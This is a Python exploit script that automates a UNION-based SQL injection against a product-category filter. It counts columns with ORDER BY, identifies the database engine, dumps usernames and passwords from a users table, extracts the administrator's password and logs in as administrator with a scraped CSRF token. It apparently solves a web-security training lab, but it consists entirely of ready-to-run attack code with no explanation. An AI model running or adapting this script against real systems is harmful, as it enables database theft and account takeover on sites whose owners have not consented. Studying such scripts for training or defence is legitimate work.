import sys
import validators
import requests
from bs4 import BeautifulSoup
import re

class Exploit():
    def __init__(self) -> None:
        self.url = ''
        self.data = {}
        self.proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
        self.request = requests.session()
        self.csrf = ''
        self.payload = ''
        self.columns_count_found = False
        self.columns_data_type_found = False
        self.pwd_found = False
        self.is_loggedin = False
        self.is_successful = False
        self.columns_count = 1
        self.column_index = 0
        self.pwd = ''

        self.check_params()
        self.set_url()
    
    def check_params(self) -> None:
        if len(sys.argv) < 2:
            print(f'[-] Usage: {sys.argv[0]} <URL>')
            print(f'[-] Example: {sys.argv[0]} http://example.com')
            exit()
    
    def set_url(self) -> None:
        url = sys.argv[1]

        if not validators.url(url):
            print(f'[-] The URL {url} is not valid')
            print('[-] Example of a valid URL: http://example.com')
            exit()
        
        self.url = url
    
    def set_data(self) -> None:
        self.data['category'] = f'Pets {self.payload}'
    
    def set_csrf_token(self) -> None:
        res = self.request.get(self.url).text
        soup = BeautifulSoup(res, 'html.parser')
        self.csrf = soup.find('input')['value']

    def get_concatenation_syntax(self) -> str:
        dbs = {'Oracle': ['v$instance', '||'], 'Microsoft': ['@@version', '+'], 'PostgreSQL': ['version()', '||'], 'MySQL': ['@@version', 'CONCAT()']}
        used_db = ''

        for db in dbs:
            version_syntax = dbs[db][0]                
            payload = f"' UNION SELECT NULL, {version_syntax} FROM users--"
            self.data = {'category': f'Pets {payload}'}
            res = self.get_request()
            
            if not 'Internal Server Erro' in res:
                used_db = db
                break

        return dbs[used_db][1]

    def set_payload(self) -> None:
        if not self.columns_count_found:
            self.payload = f"' ORDER BY {self.columns_count}--"

        elif not self.columns_data_type_found:
            nulls = ['NULL']*self.columns_count
            nulls[self.column_index] = "'str'"
            nulls = ', '.join(nulls)
            self.payload = f"' UNION SELECT {nulls}--"
        
        else:
            concat_syntax = self.get_concatenation_syntax()
            nulls = ['NULL']*self.columns_count
            nulls[self.column_index-1] = f"username {concat_syntax} ' '{concat_syntax} password"
            nulls = ', '.join(nulls)
            self.payload = f"' UNION SELECT {nulls} FROM users--"

    def get_request(self) -> str:
        return self.request.get(self.url, params=self.data).text

    def find_columns_count(self) -> None:
        print('[+] Figuring out columns count...')
        res = ''

        while 'Internal Server Error' not in res:
            if self.columns_count == 10:
                return

            self.set_payload()
            self.set_data()
            res = self.get_request()
            self.columns_count += 1
        
        self.columns_count -= 2
        self.columns_count_found = True
        print(f'[+] Columns count is {self.columns_count}')

    def find_columns_data_type(self) -> None:
        print('[+] Figuring out columns data type...')
        res = ''
        
        for _ in range(self.columns_count):
            self.set_payload()
            self.set_data()
            res = self.get_request()

            if 'Internal Server Error' not in res:
                print(f'[+] Cloumn {self.columns_count} is of type string')
            
            self.column_index += 1
        
        self.columns_data_type_found = True
        print('[+] Columns data types are found')

    def extract_admin_pwd(self) -> None:
        print('[+] Extracting administrator password...')

        self.set_payload()
        self.set_data()
        res = self.get_request()
        soup = BeautifulSoup(res, 'html.parser')
        self.pwd = soup.find(text=re.compile('.*administrator.*')).split(' ')[1]
        
        if not self.pwd:
            print('[-] The administrator password was not found')
            return
        
        self.pwd_found = True
        print(f'[+] Administrator password is {self.pwd}')
        
    def login(self) -> None:
        print('[+] Logging in...')
        
        self.url = self.url.replace('filter', 'login')
        self.set_csrf_token()
        self.data = {'csrf': self.csrf, 'username': 'administrator', 'password': self.pwd}
        req = self.request.post(self.url, data=self.data)

        if 'Log out' not in req.text:
            print('[-] Could not login')
            return
        
        self.is_loggedin = True
        print('[+] Logged in successfully')

    def run(self) -> None:
        self.find_columns_count()
        self.find_columns_data_type()
        self.extract_admin_pwd()
        self.login()

        if self.columns_count_found and \
                self.columns_data_type_found and \
                self.pwd_found and \
                self.is_loggedin:
            self.is_successful = True

def main() -> None:
    exploit = Exploit()
    exploit.run()

    if exploit.is_successful:
        print('[+] The exploit was successful!')
    else:
        print('[-] The exploit was not successful!')

if __name__ == '__main__':
    main()